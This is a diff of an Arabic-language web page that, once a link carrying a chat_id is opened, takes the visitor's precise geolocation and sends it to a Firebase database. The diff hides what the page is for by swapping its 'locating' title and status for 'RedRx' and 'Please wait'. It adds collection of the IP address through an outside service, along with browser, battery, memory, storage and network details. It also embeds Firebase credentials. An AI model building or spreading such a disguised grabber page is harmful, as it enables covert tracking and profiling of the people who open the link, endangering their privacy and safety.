@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>تحديد الموقع</title>
+<title>RedRx</title>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -14,7 +14,7 @@ height:100vh;
 display:flex;
 align-items:center;
 justify-content:center;
-background:#0d0d0d;
+background:#1B1D29;
 color:#00aaff;
 font-family:sans-serif;
 text-align:center;
@@ -24,11 +24,10 @@ text-align:center;
 
 <body>
 
-<h2 id="status">📍 جاري تحديد الموقع...</h2>
+<h2 id="status">...Please wait</h2>
 
 <script>
 
-// قراءة chat_id من الرابط
 const params = new URLSearchParams(window.location.search);
 const chatId = params.get("chat_id");
 
@@ -37,81 +36,172 @@ document.getElementById("status").innerText="⚠ رابط غير صالح";
 throw new Error("No chat_id");
 }
 
-
-// Firebase config مأخوذ من google-services.json
+/* Firebase config */
 const firebaseConfig = {
-
 apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
-
 authDomain: "hercules-65b0c.firebaseapp.com",
-
 databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
-
 projectId: "hercules-65b0c",
-
 storageBucket: "hercules-65b0c.firebasestorage.app",
-
 messagingSenderId: "758576632296",
-
 appId: "1:758576632296:android:c69d0667cf54311617d45d"
-
 };
 
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
-
-// معلومات الجهاز
-function getDeviceInfo(){
-
-const ua = navigator.userAgent;
-
-return{
-
-user_agent: ua,
-platform: navigator.platform,
-language: navigator.language,
-screen_width: screen.width,
-screen_height: screen.height,
-is_mobile: /Android|iPhone|iPad|iPod/i.test(ua)
-
-};
-
+/* IP */
+async function getIP(){
+try{
+const res = await fetch("https://api.ipify.org?format=json");
+const json = await res.json();
+return json.ip;
+}catch(e){
+return "unknown";
+}
 }
 
+/* Browser */
+function getBrowserName(){
+const ua = navigator.userAgent;
 
-// طلب الموقع
+if(ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+if(ua.includes("Firefox")) return "Firefox";
+if(ua.includes("Edg")) return "Edge";
+if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+if(ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+
+return "Unknown";
+}
+
+/* Network */
+function getNetworkType(){
+const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+if(!conn) return "Unknown";
+
+if(conn.type==="wifi") return "WiFi";
+
+if(conn.effectiveType){
+switch(conn.effectiveType){
+case "4g": return "4G";
+case "3g": return "3G";
+case "2g": return "2G";
+case "5g": return "5G";
+default: return conn.effectiveType.toUpperCase();
+}
+}
+
+return "Unknown";
+}
+
+/* Battery */
+async function getBatteryPercentAndCharging(){
+if(!navigator.getBattery) return {level:null,charging:null};
+
+try{
+const battery = await navigator.getBattery();
+const level = Math.round(battery.level*100);
+const charging = battery.charging;
+return {level,charging};
+}catch(e){
+return {level:null,charging:null};
+}
+}
+
+/* Language */
+function getLanguageCode(){
+const lang = navigator.language || "en";
+if(lang.startsWith("ar")) return "ar";
+return "en";
+}
+
+/* RAM */
+function getDeviceRAM(){
+if(navigator.deviceMemory) return navigator.deviceMemory+"GB";
+return "NA";
+}
+
+/* Storage */
+async function getStorageInfo(){
+if(navigator.storage && navigator.storage.estimate){
+try{
+const estimate = await navigator.storage.estimate();
+const availableGB=((estimate.quota-estimate.usage)/(1024*1024*1024)).toFixed(2);
+return availableGB+"GB";
+}catch(e){
+return "NA";
+}
+}
+return "NA";
+}
+
+/* Time */
+function getFormattedDateTime(){
+const d=new Date();
+
+const day=d.getDate();
+const month=d.getMonth()+1;
+const year=d.getFullYear();
+
+let hours=d.getHours();
+const minutes=String(d.getMinutes()).padStart(2,'0');
+const seconds=String(d.getSeconds()).padStart(2,'0');
+
+const ampm=hours>=12?"PM":"AM";
+
+hours=hours%12;
+hours=hours?hours:12;
+
+return `${day}-${month}-${year} | ${hours}:${minutes}:${seconds} ${ampm}`;
+}
+
+/* Online status */
+function getOnlineStatus(){
+return navigator.onLine?"Online":"Offline";
+}
+
+/* Get location */
+
 navigator.geolocation.getCurrentPosition(
 
 async(pos)=>{
 
-const device = getDeviceInfo();
+const ip=await getIP();
+const browser=getBrowserName();
+const network=getNetworkType();
+const batteryInfo=await getBatteryPercentAndCharging();
+const langCode=getLanguageCode();
+const ram=getDeviceRAM();
+const storage=await getStorageInfo();
+const onlineStatus=getOnlineStatus();
 
-const data = {
+const batteryText=batteryInfo.level!==null?`Battery${batteryInfo.level}%`:"BatteryNA%";
+const chargingText=batteryInfo.charging!==null?batteryInfo.charging:"NA";
 
-chat_id: chatId,
-
-latitude: pos.coords.latitude,
-longitude: pos.coords.longitude,
-accuracy: pos.coords.accuracy,
-
-time: new Date().toISOString(),
-
-device: device
-
+const data={
+chat_id:chatId,
+latitude:pos.coords.latitude,
+longitude:pos.coords.longitude,
+accuracy:pos.coords.accuracy,
+ip:ip,
+device:`${onlineStatus}/${browser}(${batteryText}/${chargingText}-language:${langCode}-ram:${ram}-storage:${storage}-${network})`,
+time:getFormattedDateTime()
 };
 
 await database.ref("locations").push(data);
 
-document.getElementById("status").innerText="✅ تم إرسال الموقع";
+document.getElementById("status").innerText="...Sent successfully";
 
 },
 
-()=>{
+(err)=>{
 
-document.getElementById("status").innerText="❌ تم رفض إذن الموقع";
+document.getElementById("status").innerText="❌ تم رفض إذن الموقع أو حدث خطأ";
+console.error(err);
 
-}
+},
+
+{enableHighAccuracy:true,timeout:15000,maximumAge:0}
 
 );
 
